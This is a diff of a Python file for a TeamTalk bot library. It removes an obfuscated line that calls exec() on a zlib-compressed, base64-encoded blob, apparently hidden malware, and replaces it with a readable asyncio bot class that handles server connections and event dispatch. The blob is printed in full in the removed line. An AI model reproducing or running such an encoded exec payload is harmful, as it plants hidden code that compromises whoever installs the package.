@@ -1,2 +1,261 @@
-import base64, zlib
-exec(zlib.decompress(base64.b64decode(b'eJzNWVtv47gVfvevYBUUo2w1miz6ZmwGzVyKBjvYXSRu9yEwFFqibTWyKFBUPO7u/Peec3gRdXGm06f1gyFT5LlfPh5HUXTDDrLoKsH0nmuWy1rzsm7hl2ArwQ8rXj29k/Ci4m2bLharuXVWmgMHOGpX5JZWqnKjuDqli1v9qmVdKwqmJcuV4FowzjZSJ8CyFrnGdV6fGD/IrtZ43rFhrVDPQrXwumBF2TZc53smnkWtQaIoihaL8tBIpRlvT3VeSvezkrtdWe8WWyUPTJ8aeGb21U19Sth7XlV8Uwl4kkp2uqzh8UOZ64R9Klv4/rnRpax5lbBV1+C+1amx3//iKmH/rOH1Yo7+vai29kUq6u7QuhdOqXvS6bbeSrsLjK55nYvxxlu7DqZn1451HK2iywVKDWte+AfSir5Wa3o7OEILUQJG7+ri2in/kKapMQAeX68vF4uFcWH2ScrmHqwMpKvlgsEny9pK6jbLgG4MO3GtEFtY3wnNtVZZFregesLwx5K1Wl2y12/ZT7IWhgJ+Du0OzkcVkKd95aaDaMh5XUNAbSAu8ly0GCoQTbWsX5NbKTTFZ3A5izwlxctWsBtH46NSUsVAHpXIkP4SzQHMBrqA5PASZbARkoL0n+BRqDjLan4QWdabIYh2o0KESWPeUc4o0SjRYjRCRPughdBOKTZ7G5V1qb2B8qqEI8Rt6QPtAQy2Rtv8ckIi0YzxgOYt0Cl5Vf5HBAwxGeXm35BJ6cJvvlG7tj+Kn4AtiwdsL5cMk5ve2Ow1m1P2QWx5V4F+kKMRMtTAMG1OURqK5Z9RwTRkdB2yHW4zTrKJm95sQBKe64+Y3OgydB1u8Ycu2F5WBehdQYYOqoRLoHbIQFtx2yUl9cM4r9DcD+vhmQyJixpqzpLqAdonscexEDw4ef/e6U6JvpKYZNpIWa3hA5R/+2KcYUIYw4AXRWYKmg0E82NpisnDtD4kUPNyvZ4PhZsCbWFIoHfQaxh5L4WAY3jzNZY2nvoAxwKHHHp+oE06II6fW9CSKGBwqRN2h0bJ57IQRcJKzY5lVWGeQ0YDGW16Ap8pjT6g56Ks3AJh5/TYiGQEv5zTFyvhhEGKtTfDM5bApT+JFSItxKbbxVs0M+ruLPdb6LkvUX9I64DNbS9bv/syiGTb+YLTqV2Kw20gSFmHm2gh2DKM85Q3jaiLWOugQKuuJjEuh9HDNpXMn1C1HCLYQwAUgZIdF8HF4KGwB+/hqxItvbVt2Fe6YbADW8iieOQQ8/5Y6j2JvpwEED9yCBOTimBDpV2vIQOo0/DEBeyEUtApRh0FA9Tmp5GODQqIFwDSF63iROzNKT7notHsR3HaSK6KW2g7SnWNHnOFbrWnjJCskGwvlBhteAz4PHqrESxCQfNK8LprRofQwI+kOmn+CNtka43dgrOENk5AMv9YrX55T5XVV79hNioB9akel6CMHqEK6a7J9lI+mdCYFpgLKmzg/eMeqiGlvO8KrBaioCApbTtqe7ubvG2NjzmFAVpq4IjKlHdnI2jBmd1HFX8c33Y7kRjrk3GBTrK9lRS5HwSWadkGQABKrfmOdIFoL3tUChIY/aRSWPb64AnK6R1ZdFRRiRkbQ+OXilcY4RNv9Job/9G+OaU/E54Y2CkJwzgDUBqiC4SCD+94Kz5SiMPiej088MyrLjwx3JwESchzseH5k1mab06/QtSwo2AoJ1kWusBO8UOCOUxpU7YO/RMIphg3hebFDuZUCxDMnGoW0Qi3ghh9lCBe54DUkMqECG0fUvHWMHv9z3nfbyXEnq3WCHFHMGVI2YGt3lRBeAx2UJ1w8ReCc4pjhzoB5y8J7a8S9obcRj9GqVII2Mi1VA7h7hAQUfm3aQHeMyAJngJfkamoJbBD1xo0z5ZKbJePubumsB/849vHBPs4VNKELcHEy0f0I8H4R0xNwvdFQP/jZ34AAOZ/v3affkuagpaFeE2tbblkzUnvZf3XxcBqf7PQlmSdaU5oN1lncE8tTuP2hZ9GlWDTV3f4/k+v8LLg3twLQbG+LCSoY4x1J7bQHfBy98MbY523jxQGB6ngwgdARB04BRdW9h7bBg128SKox4tgTI604dobGxzl3Pe1MmYiYXweA+DIW09l4I87dNCIjHfhmBQ4FG94PFjadjXBxPlMCTBYdGfZYx8xVv1zG5mAToNLmztqosp3F8wey9OxjHFl5Fpzn/QKxJHh1KseRPVUiSjg35r7cJB2XkrzcxZpei2B03klvbSmO+DbSXeAVpqZxD/THmwlmEwBxpMEGgoETeK5v7Xirci/+I5jWNKZfu27p+NoeaZTTADdwCAWOgTW6EUYVkLTU1GvmIRJPP8JtnNh8R4hEyIcE69npfhouVMi5O7QGVksD99CRhV9rG0vOjUCqDqCYq8nnbCz+nyjTvhpeNsGU4k23wuc//1xo8UptuLtU4hNqQYzc2/xXQf7ktz5XUeFt6ECgKPBWn1aoEah/14w8gW7t0Yy6F2DIHMQjTBqaoabGW6KLfuEpirX20j3sxO4RfbMv7jSMeg+Jg5MBTF7DwJ6WWFsyd4koRmH5psHZL+j0r+zUb8uzHSHETt7TVH+xs42p3AW1B99d/In4R7UotlbN4KwY1+arwGtvTzS7YHSs6uAZt/BJbxQJdwxEUkA92dBw4MtdUyN09BKHOCJD9vEAGcZ9EhS9DjNiLQz2N5cumjYZ+fdLwPMwNosxinmsoc2zK5TZySjidEQhNzCYvSDOQe/u4OLTx+to0PWf+G5J3E6SlV89fykaXozxNHtrpama/amqcNKatQJAKObsYeh93/H3Ac3sA+hIyatn7GloGpJ/yHk5rZZ4mUOkHh1+rqTQu+Eo0vPyinzR/OQ7SzOPHM9rq9ANuKuWQRlIWJ/Me9743hb+kLXWxeutfGIHICjfsI5GhgcICGL4UwUP4hWy4TFWzvxhMtIUWIwXWI04V8cAi4MIvZ0Z0AzsDXHU99C57B1IIebZZWXs7vwRl/WnVhM3s52WUO4xYp13StgwMKUwbiNQ23GtXmyVi9AfVmfevA0L/fXtRNVK+Y5gRGNDvOv7ZZK1DGpxa6v2dX5rSPZDeUYk3heciPbmMH338oATz5crV/icU7/l4mepzi1+WCrVcnuIq3w90vhPE60RjbjRDuvCuVT8RmTR2FvhGuuZz6veCGCmvkAZ9cvzERz89fgbnALcYXeS2YifPj32ZAOgcXzmtgR7RBCGmRlmM2gqvFNxQx4R8NpIuz7UET38ChEZAf+hEDhuC8rO06lq3NVySPCDLz1djVaGY173k7m/Ep1My66cPNkgLm7vUF+bkpD3EBtwB7kSoM+Z738v4563MfcBTxSzACI4d+hxrhtPI1wc8Ch5LYSoomv0qur7799pD2dy6H5TmbOTfPq6jRpC9+i4MVk5tf/nzQt4n74JT/JHdw1ZpQfBcrhhM0VtkIP9cfH/7xM6Z8brs1z6LfPcRnHdyEzvsXpNCQwP9lUpOeEJgfTFOnNNudaOtqLaSZR0a8/3/14DxnyX9Nj94c=')))
+"""A module that contains the TeamTalkBot class.
+
+The TeamTalkBot class is the main class of the library.
+It's used to create a bot,connect to any amount of TeamTalk servers and dispatch events.
+"""
+
+import asyncio
+import logging
+from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple, Type, TypeVar, Union
+
+from typing import Self
+
+from .enums import TeamTalkServerInfo
+from .instance import TeamTalkInstance
+
+T = TypeVar("T")
+Coro = Coroutine[Any, Any, T]
+CoroT = TypeVar("CoroT", bound=Callable[..., Coro[Any]])
+
+
+class _LoopSentinel:
+    __slots__ = ()
+
+    def __getattr__(self, attr: str) -> None:
+        msg = "loop attribute cannot be accessed in non-async contexts. "
+        raise AttributeError(msg)
+
+
+_loop: Any = _LoopSentinel()
+_log = logging.getLogger(__name__)
+
+
+class TeamTalkBot:
+    """A class that represents a TeamTalk bot."""
+
+    def __init__(self, client_name: Optional[str] = "PyTalk") -> None:
+        """Initialize a TeamTalkBot object.
+
+        Args:
+            client_name (Optional[str]): The name of the client. Defaults to "Teamtalk.py".
+        """
+        self.client_name = client_name
+        self.loop: asyncio.AbstractEventLoop = _loop
+        # hold a list of TeamTalk instances
+        self.teamtalks: List[TeamTalkInstance] = []
+        self._listeners: Dict[str, List[Tuple[asyncio.Future, Callable[..., bool]]]] = {}
+
+    async def add_server(self, server: Union[TeamTalkServerInfo, dict]) -> None:
+        """Add a server to the bot.
+
+        Args:
+            server: A Union[TeamTalkServerInfo, dict] object representing the server to add.
+                If a dictionary is provided, it will be converted to a TeamTalkServerInfo object.
+        """
+        if isinstance(server, dict):
+            server = TeamTalkServerInfo.from_dict(server)
+        _log.debug(f"Adding server: {self, server}")
+        tt = TeamTalkInstance(self, server)
+        # connect
+        tt.connect()
+        # login
+        tt.login()
+        self.teamtalks.append(tt)
+
+    def run(self):
+        """A blocking call that connects to all added servers and handles all events."""
+
+        async def runner():
+            async with self:
+                await self._start()
+
+        try:
+            # set our loop the asyncio event loop
+            asyncio.run(runner())
+        except KeyboardInterrupt:
+            # nothing to do here
+            # `asyncio.run` handles the loop cleanup
+            # and `self.start` closes all sockets and the HTTPClient instance.
+            return
+
+    async def _async_setup_hook(self) -> None:
+        # Called whenever the client needs to initialise asyncio objects with a running loop
+        loop = asyncio.get_running_loop()
+        self.loop = loop
+
+    async def __aenter__(self) -> Self:
+        """A context manager that is used to get the correct event loop.
+
+        Returns:
+            Self: The TeamTalkBot object.
+        """
+        await self._async_setup_hook()
+        return self
+
+    async def __aexit__(
+        self,
+        exc_type: Optional[Type[BaseException]],
+        exc_value: Optional[BaseException],
+        traceback,
+    ) -> None:
+        """When we exit the program, try to disconnect from all servers.
+
+        Args:
+            exc_type (Optional[Type[BaseException]]): The exception type.
+            exc_value (Optional[BaseException]): The exception value.
+            traceback: The traceback.
+        """
+        for teamtalk in self.teamtalks:
+            teamtalk.disconnect()
+            teamtalk.closeTeamTalk()
+
+    def event(self, coro: CoroT, /) -> CoroT:
+        """A decorator that registers an event to listen to.
+
+        The events must be a :ref:`coroutine <coroutine>`, if not, :exc:`TypeError` is raised.
+
+        Example
+        ---------
+
+        .. code-block:: python3
+
+            @client.event
+            async def on_ready():
+                print('Ready!')
+
+
+        See the :doc:`event Reference </events>` for more information and a list of all events.
+
+
+        Args:
+            coro (CoroT): The coroutine to register.
+
+        Returns:
+            CoroT: The coroutine that was registered.
+
+        Raises:
+            TypeError: The coroutine is not a coroutine function.
+        """
+        _log.debug("Registering event %s", coro.__name__)
+
+        if not asyncio.iscoroutinefunction(coro):
+            raise TypeError("event registered must be a coroutine function")
+
+        setattr(self, coro.__name__, coro)
+        _log.debug("Registered event %s", coro.__name__)
+        return coro
+
+    async def _run_event(
+        self,
+        coro: Callable[..., Coroutine[Any, Any, Any]],
+        event_name: str,
+        *args: Any,
+        **kwargs: Any,
+    ) -> None:
+        try:
+            _log.debug("Running event %s", event_name)
+            await coro(*args, **kwargs)
+        except asyncio.CancelledError:
+            _log.debug("Event %s was cancelled", event_name)
+        except Exception:
+            try:
+                await self.on_error(event_name, *args, **kwargs)
+            except asyncio.CancelledError:
+                pass
+
+    def _schedule_event(
+        self,
+        coro: Callable[..., Coroutine[Any, Any, Any]],
+        event_name: str,
+        *args: Any,
+        **kwargs: Any,
+    ) -> asyncio.Task:
+        # print all the events to log
+        wrapped = self._run_event(coro, event_name, *args, **kwargs)
+        # Schedules the task
+        return self.loop.create_task(wrapped, name=f"teamtalk.py: {event_name}")
+
+    async def on_error(self, event_method: str, /, *args: Any, **kwargs: Any) -> None:
+        """|coro| .
+
+        The default error handler provided by the client.
+
+        By default this logs to the library logger however it could be
+        overridden to have a different implementation.
+        The traceback from this exception is logged to the logging module.
+
+        Args:
+            event_method (str): The event method that errored.
+            *args (Any): The arguments to the event.
+            **kwargs (Any): The keyword arguments to the event.
+        """
+        _log.exception("Ignoring exception in %s", event_method)
+
+    def dispatch(self, event: str, /, *args: Any, **kwargs: Any) -> None:
+        """Dispatch an event to all listeners. This is called internally.
+
+        Args:
+            event (str): The name of the event to dispatch.
+            *args (Any): The arguments to the event.
+            **kwargs (Any): The keyword arguments to the event.
+        """
+        _log.debug("Dispatching event %s", event)
+        method = "on_" + event
+
+        listeners = self._listeners.get(event)
+        if listeners:
+            removed = []
+            for i, (future, condition) in enumerate(listeners):
+                if future.cancelled():
+                    removed.append(i)
+                    continue
+
+                try:
+                    result = condition(*args)
+                except Exception as exc:
+                    future.set_exception(exc)
+                    removed.append(i)
+                else:
+                    if result:
+                        if len(args) == 0:
+                            future.set_result(None)
+                        elif len(args) == 1:
+                            future.set_result(args[0])
+                        else:
+                            future.set_result(args)
+                        removed.append(i)
+
+            if len(removed) == len(listeners):
+                self._listeners.pop(event)
+            else:
+                for idx in reversed(removed):
+                    del listeners[idx]
+
+        try:
+            coro = getattr(self, method)
+        except AttributeError:
+            pass
+        else:
+            self._schedule_event(coro, method, *args, **kwargs)
+
+    async def _start(self):
+        self.dispatch("ready")
+        # make a while loop and allow it to run forever
+        try:
+            while True:
+                # loop through the teamtalks and check  for events
+                for teamtalk in self.teamtalks:
+                    await teamtalk._process_events()
+                await asyncio.sleep(0.001)
+        except KeyboardInterrupt:
+            # try to disconnect everything cleanly
+            for teamtalk in self.teamtalks:
+                # disconnect from the server
+                teamtalk.doLogout()
+                self.dispatch("my_logout", teamtalk.server)
+                teamtalk.disconnect()
+                self.dispatch("my_disconnect", teamtalk.server)
+
+    async def _do_after_delay(self, delay, func, *args, **kwargs):
+        await asyncio.sleep(delay)
+        print("WORKS")
